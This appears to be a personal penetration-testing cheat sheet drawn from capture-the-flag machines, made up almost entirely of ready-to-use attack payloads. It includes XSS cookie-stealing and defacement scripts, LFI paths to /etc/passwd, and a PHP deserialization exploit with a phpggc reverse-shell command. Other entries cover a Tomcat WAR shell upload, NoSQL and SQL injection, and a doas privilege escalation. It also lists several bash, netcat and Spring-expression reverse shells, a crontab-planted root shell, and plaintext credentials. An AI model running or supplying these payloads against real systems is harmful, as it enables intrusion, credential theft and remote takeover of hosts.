#XSS
<script>alert("Xss");</script>
"><script>alert("Xss");</script>
; alert("XSS")
onmouseover="alert(document.domain)"
">"<img src="x" onerror='javascript:alert("XSS");'>
<img src="x" onerror='javascript:alert("XSS");'>
<img src=x onerror="fetch('[HOST]' + document.cookie)" />
javascript:alert("xss")
src="x" onerror='javascript:alert("XSS")
<iframe src="javascript:alert(`xss`)">
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
Steal Cookie:

<script>var i=new Image(); i.src="http://192.168.1.103/?cookie="+btoa(document.cookie);</script>

defacemant:
<script>document.documentElement.innerHTML="<style>h1{align: ceneter;}</style><html><h1>Hacked by s1l3ntmask</h1>What do you think of me now?</html>"</script>

#LFI
../admin.php
..//admin.php
file/../../admin.php
/export/../../../../../../../etc/passwd

#VulnFiles
/.git
/metrics
/assets (may be vuln to lfi)
#API Manipulation
curl -X POST https://48zywdcy.eu1.ctfio.com/api/v1/auth/new -i
curl -X POST https://48zywdcy.eu1.ctfio.com/api/v1/auth/new -i -d "username=masking&email=alex@gmail.com&password=password&password2=password"
curl -X POST https://48zywdcy.eu1.ctfio.com/api/v1/users/verify -i -d "user_id=c1fd4b1f-47bd-4521bb5a-5ef1173c7c42&verification_token=b94f1f124023cda54b81fe7f1f658faa"
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2Fuser.txt" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
#Deserialization
href=/home/anonymous/PTS/PWNX/Begginers Hub/Deserialization1
Generating ad-hoc serialized object to exploit the deserialization vulnerability. This exploit points to reach the file write logic in the php class deconstructor by injecting the serialized object with the $writeLog variable set to true, and using as username or password some malicious code that allow an attacker to read the flag.
Here we are executing the exploit to generate the malicious serialized object. The object is then base64Url encoded and sanitized by removing the equal and substituting the /+ characters with -_. using the tr command.
Making a request with the serialized object the application should write a file in the webroot with the content of the username and password.
Since the application gives us multiple ways to exploit the deserialization vulnerability. An attacker can try to exploit the issue by using the gadgets installed on the application. On the vulnerable target is possible to have a list of the installed gadgets via the file composer.json .
To exploit with the gadget chains we need to use a tool called PHPGGC (https://github.com/ambionics/phpggc). By typing ./phpggc -l we have a list of all available gadgets.
For this example we can use the gadget Monolog/RCE3. This time in order to read the flag an attacker needs to obtain a reverse or bind shell on the system. To achieve 
this we need to generate the Monolog Function call serialized object.

./phpggc Monolog/RCE3 system '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.80.1.150/9002 0>&1"' | base64 -w 0 | tr -d  '=' | tr '/+' '-_'

Here we are generating the object and then encoding as we did with the "Custom class exploit". Once the malicious object is generated an attacker needs to start a listener on the port chosen during the object generation, and then make a request to the vulnerable application with the malicious object. At this point an attacker should obtain a reverse shell that allows him to execute commands on the system and read the flag.

#CMS 
tomcat can be saved as:
/opt/tomcat/
/opt/tomcat/logs/catalina.out
/opt/tomcat/conf/tomcat-users.xml
curl -u tomcat:REDACTED --upload-file shell.war "http://backtrack.thm:8080/manager/text/deploy?path=/shell&update=true"

#NoSQL Injection
username=admin' || 'a'=='a&password=admin
'; return '' == '
#Citrix
#Banner
nmap --script=banner
nc ip port
curl -IL host
#SMB
smbclient -U bob \\\\10.129.42.253\\users
#SNMP
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253 
onesixtyone -c dict.txt 10.129.42.254
#MYSQL won't work
mysql -h db -u root -proot cacti -e 'show tables;'
#Bypass antivirus
Evasion in msfconsole
#Payloads
Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
    
Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
    
Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
    
Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
#MSF
show paylaods
info
search type:auxiliary telnet
background
back
unset all / unset thing
#SSTI
 ${7*7}
 #{7*7}
 *{7*7}:
       error:
             {{7*7}}:
                     error:
                           No Vuln
             works:
                  {{7*'7'}}:
                            error:
                                  Unknown
                            works: 
                                  Twig
                                  Jinja2
      works:
            a{*comment*}b:
                          works: 
                                Smarty
                          error:
                                ${"z".join("ab")}:
                                                  error:
                                                         Unknown
                                                  works: 
                                                        Mako
                                                        
Bypass unload SSTI:
0%A

#SQLI
PRAGMA table_info(customers);
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
#DOAS
cat /usr/local/etc/doas.conf
Got: permit nopass player as root cmd /usr/bin/dstat
man dstat
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
doas /usr/bin/dstat --list
doas /usr/bin/dstat --pwn
#Revshell
Java:

echo -n "bash -i >& /dev/tcp/10.10.14.18/9002 0>&1" | base64

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAyIDA+JjE=}|{base64,-d}|{bash,-i}")

Linux:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 9002 >/tmp/f
/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.7/9002 0>&1\'
mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc <IP> 443 1>/tmp/backpipe
#SSH
sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@metapress.htb
#PGP
use gpg john
#DNS
dig axfr friendzone.red @10.10.10.123
#Module Hijacking
Find a writeable file:

/usr/lib/python2.7/os.py

shell = '''
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 9010 >/tmp/f 
'''
f = open('/etc/crontab', 'a')
f.write(shell)
f.close()


